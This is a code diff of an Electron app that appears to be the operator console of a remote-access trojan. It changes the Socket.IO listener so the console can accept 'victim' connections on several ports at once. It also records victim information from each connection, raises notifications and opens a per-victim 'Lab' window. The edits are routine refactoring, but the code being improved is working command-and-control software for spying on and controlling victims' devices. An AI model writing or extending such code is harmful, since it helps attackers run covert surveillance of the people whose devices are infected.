@@ -9,7 +9,7 @@ module.exports = victimsList;
 let win;
 let display;
 var windows = {};
-var IO;
+const IOs = {};
 //--------------------------------------------------------------
 
 function createWindow() {
@@ -60,7 +60,7 @@ function createWindow() {
   //------------------------Main SCREEN INIT------------------------------------
   // Create the browser window.
   win = new BrowserWindow({
-    icon: __dirname + '/app/assets/img/icon.png', 
+    icon: __dirname + '/app/assets/img/icon.png',
     width: 900,
     height: 690,
     show: false,
@@ -128,20 +128,18 @@ app.on('activate', () => {
 
 
 
-// fired when start listening
-// It will be fired when AppCtrl emit this event
+const listeningStatus = {}; // Object to track listening status for each port
+
 ipcMain.on('SocketIO:Listen', function (event, port) {
-  let isListening = false;
-  
-  if (isListening) {
-    event.reply('SocketIO:ListenError', '[x] Already Listening on Port: ' + port);
+  if (listeningStatus[port]) {
+    event.reply('SocketIO:ListenError', '[x] Already Listening on Port ' + port);
     return;
   }
 
-  IO = io.listen(port);
-  IO.sockets.pingInterval = 10000;
-  IO.sockets.on('connection', function (socket) {
-    // Get victim info
+  IOs[port] = io.listen(port);
+  IOs[port].sockets.pingInterval = 10000;
+
+  IOs[port].sockets.on('connection', function (socket) {
     var address = socket.request.connection;
     var query = socket.handshake.query;
     var index = query.id;
@@ -175,7 +173,9 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
     // Emitted when the window is finished loading.
     notification.webContents.on('did-finish-load', function () {
       notification.show();
-      setTimeout(function () { notification.destroy() }, 3000);
+      setTimeout(function () {
+        notification.destroy()
+      }, 3000);
     });
 
     notification.webContents.victim = victimsList.getVictim(index);
@@ -200,40 +200,37 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
         delete windows[index]
       }
 
+      //notify renderer proccess (LabCtrl) if opened about the Server Disconnecting
       if (windows[index]) {
         BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:ServerDisconnected");
+        // delete the window from the winowsList
         delete windows[index]
       }
     });
-
   });
 
   event.reply('SocketIO:Listen', '[✓] Started Listening on Port: ' + port);
-  isListening = true;
-
+  listeningStatus[port] = true; // Update listening status for the specific port
 });
 
-// fired when the stop button is clicked
 ipcMain.on('SocketIO:Stop', function (event, port) {
-  if (IO) {
-      IO.close();
-      IO = null;
-      event.reply('SocketIO:Stop', '[✓] Stopped Listening on all Ports');
-      isListening = false;
+  if (IOs[port]) {
+    IOs[port].close();
+    IOs[port] = null;
+    event.reply('SocketIO:Stop', '[✓] Stopped listening on Port: ' + port);
+    listeningStatus[port] = false; // Update listening status for the specific port
   } else {
-      event.reply('SocketIO:StopError', '[x] The Server is not Currently Listening');
+    event.reply('SocketIO:StopError', '[x] The Server is not Currently Listening');
   }
 });
 
 process.on('uncaughtException', function (error) {
   if (error.code == "EADDRINUSE") {
-      win.webContents.send('SocketIO:ListenError', "Address Already in Use");
+    win.webContents.send('SocketIO:ListenError', "Address Already in Use");
   } else {
-      electron.dialog.showErrorBox("ERROR", JSON.stringify(error));
+    electron.dialog.showErrorBox("ERROR", JSON.stringify(error));
   }
 });
-
-
 
 // Fired when Victim's Lab is opened
 ipcMain.on('openLabWindow', function (e, page, index) {
